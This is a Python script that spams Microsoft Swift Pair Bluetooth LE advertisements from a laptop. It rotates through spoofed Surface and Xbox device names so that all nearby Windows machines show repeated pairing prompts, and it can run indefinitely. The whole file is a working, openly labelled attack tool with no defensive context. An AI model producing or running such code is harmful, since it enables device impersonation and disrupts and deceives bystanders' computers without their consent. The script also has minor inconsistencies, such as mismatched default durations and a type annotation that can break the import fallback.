"""
SwiftPair Laptop BLE Advertiser Module (Python WinRT Edition)
Transmits continuous Microsoft Swift Pair BLE advertisements directly from the laptop's Bluetooth adapter.
Rotates through multiple Microsoft device profiles to broadcast pair requests to all nearby Windows devices.
No external hardware (ESP32 / Flipper Zero) required.
"""

import sys
import time
import argparse

try:
    from winrt.windows.devices.bluetooth.advertisement import (
        BluetoothLEAdvertisementPublisher,
        BluetoothLEManufacturerData
    )
    from winrt.windows.storage.streams import DataWriter
    WINRT_AVAILABLE = True
except ImportError:
    WINRT_AVAILABLE = False


SWIFTPAIR_DEVICE_PROFILES = [
    "Surface Ergonomic Keyboard",
    "Xbox Wireless Controller",
    "Surface Headphones 2",
    "Surface Precision Mouse",
    "Surface Arc Mouse",
    "Surface Earbuds",
    "Microsoft Presenter+",
    "Microsoft Audio Dock",
    "Surface Dial",
    "Microsoft Modern Headset"
]


def create_swiftpair_publisher(device_name: str) -> BluetoothLEAdvertisementPublisher:
    publisher = BluetoothLEAdvertisementPublisher()
    m_data = BluetoothLEManufacturerData()
    m_data.company_id = 0x0006  # Microsoft Company ID

    writer = DataWriter()
    writer.write_byte(0x03)  # Swift Pair Beacon ID
    writer.write_byte(0x00)  # Subscenario ID (Swift Pair)
    writer.write_byte(0x80)  # Payload Flags / RSSI byte

    name_bytes = device_name.encode('utf-8')
    writer.write_bytes(name_bytes)

    m_data.data = writer.detach_buffer()
    publisher.advertisement.manufacturer_data.append(m_data)
    return publisher


def run_continuous_swiftpair_spam(interval_ms: int = 200, duration_seconds: int = 15):
    print("=" * 70)
    print(" [Python Continuous SwiftPair BLE Spam Module - Laptop Microcontroller] ")
    print(f" Target Profiles       : {len(SWIFTPAIR_DEVICE_PROFILES)} Microsoft SwiftPair Device Payloads")
    print(f" Switch Interval       : {interval_ms} ms")
    print(f" Total Duration        : {duration_seconds} seconds (0 = infinite)")
    print("=" * 70)

    if not WINRT_AVAILABLE:
        print("[!] Error: WinRT Python bindings not installed.")
        return

    start_time = time.time()
    iteration = 0

    try:
        while True:
            device_name = SWIFTPAIR_DEVICE_PROFILES[iteration % len(SWIFTPAIR_DEVICE_PROFILES)]
            iteration += 1

            publisher = create_swiftpair_publisher(device_name)
            publisher.start()
            print(f"[{iteration}] Broadcasting SwiftPair request -> '{device_name}'")

            time.sleep(interval_ms / 1000.0)
            publisher.stop()

            if duration_seconds > 0 and (time.time() - start_time) >= duration_seconds:
                print(f"[+] Completed {duration_seconds}s continuous broadcasting session.")
                break

    except KeyboardInterrupt:
        print("\n[!] Stopped continuous broadcasting by user.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Continuous SwiftPair Laptop BLE Spam Module")
    parser.add_argument("--name", type=str, default=None, help="Single device name to advertise (optional)")
    parser.add_argument("--interval", type=int, default=200, help="Switch interval in milliseconds (default: 200ms)")
    parser.add_argument("--duration", type=int, default=10, help="Total duration in seconds (default: 10s, 0 for infinite)")
    args = parser.parse_args()

    if args.name:
        SWIFTPAIR_DEVICE_PROFILES = [args.name]

    run_continuous_swiftpair_spam(interval_ms=args.interval, duration_seconds=args.duration)
